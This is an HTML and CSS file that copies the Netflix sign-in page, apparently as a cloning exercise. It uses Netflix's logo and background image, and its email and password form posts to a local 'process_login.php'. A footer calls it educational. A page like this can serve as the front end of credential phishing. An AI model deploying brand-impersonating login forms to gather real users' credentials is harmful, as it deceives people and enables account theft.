<!DOCTYPE html>
<html>
<head>
<title>Netflix</title>
<style>
body {
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    background-color: #000;
    color: #fff;
    margin: 0;
    padding: 0;
    overflow: hidden; /* Para evitar la barra de scroll */
}

.login-body {
    width: 100%;
    height: 100vh;
    background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/50fcc930-ba3f-4cae-9257-9f920e30a998/web/ES-en-20250310-TRIFECTA-perspective_3d6fec3b-833a-415d-ad70-312e72703cce_medium.jpg');
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    position: relative; /* Necesario para el pseudo-elemento */
}

.login-body::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.6); /* Oscurece la imagen de fondo */
}

.header {
    position: absolute;
    top: 0;
    left: 0;
    padding: 20px;
    width: 100%;
    box-sizing: border-box;
    z-index: 1; /* Asegura que el header esté por encima del overlay */
}

.logo {
    width: 167px;
    height: 45px;
}

.login-container {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: rgba(0, 0, 0, 0.75);
    padding: 60px 68px 40px;
    border-radius: 4px;
    width: 450px;
    box-sizing: border-box;
    z-index: 1; /* Asegura que el formulario esté por encima del overlay */
}

.login-form h1 {
    font-size: 32px;
    margin-bottom: 28px;
    color: #fff;
}

.login-form input[type="email"],
.login-form input[type="password"] {
    width: 100%;
    padding: 16px 20px;
    margin-bottom: 20px;
    border-radius: 4px;
    border: 0;
    background-color: #333;
    color: #fff;
    box-sizing: border-box;
    font-size: 16px;
}

.login-form button {
    background-color: #e50914;
    color: #fff;
    padding: 16px 20px;
    border: 0;
    border-radius: 4px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    width: 100%;
    margin-bottom: 10px;
}

.login-form button:hover {
    background-color: #c40812;
}

.remember-me {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 30px;
}

.remember-me label {
    display: flex;
    align-items: center;
    font-size: 13px;
    color: #b3b3b3;
}

.remember-me input[type="checkbox"] {
    margin-right: 5px;
}

.help a {
    color: #b3b3b3;
    font-size: 13px;
    text-decoration: none;
}

.help a:hover {
    text-decoration: underline;
}

.login-form .new-to-netflix {
    color: #b3b3b3;
    font-size: 16px;
    margin-top: 16px;
}

.login-form .new-to-netflix a {
    color: #fff;
    text-decoration: none;
}

.login-form .new-to-netflix a:hover {
    text-decoration: underline;
}

.footer {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    padding: 20px;
    box-sizing: border-box;
    z-index: 1; /* Asegura que el footer esté por encima del overlay */
}

.footer p {
    color: #b3b3b3;
    font-size: 13px;
}
</style>
</head>
<body>

<div class="login-body">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
    </div>
    <div class="login-container">
        <form class="login-form" id="loginForm" action="process_login.php" method="post">
            <h1>Sign In</h1>
            <input type="email" id="email" name="email" placeholder="Email or phone number" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <div class="remember-me">
                <label>
                    <input type="checkbox"> Remember me
                </label>
                <div class="help">
                    <a href="#">Need help?</a>
                </div>
            </div>
            <p class="new-to-netflix">New to Netflix? <a href="#">Sign up now</a>.</p>
        </form>
    </div>
    <div class="footer">
        <p>This is a clone for educational purposes only.</p>
    </div>
</div>

<script>
    // Puedes agregar aquí alguna lógica de JavaScript si es necesario.
</script>

</body>
</html>
